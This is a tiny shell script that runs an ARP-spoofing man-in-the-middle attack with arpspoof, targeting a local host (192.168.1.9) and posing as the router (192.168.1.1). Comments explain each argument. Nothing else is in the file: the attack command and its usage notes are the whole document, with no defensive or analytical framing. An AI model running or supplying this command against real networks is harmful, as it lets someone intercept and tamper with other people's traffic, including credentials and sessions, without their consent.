#!/bin/sh


# arp spoof - man in the middle

arpspoof -i wlan0 -t 192.168.1.9 192.168.1.1

# -i wlan0 = interface
# -t 192.168.1.9 = target ip address
# 192.168.1.1 = router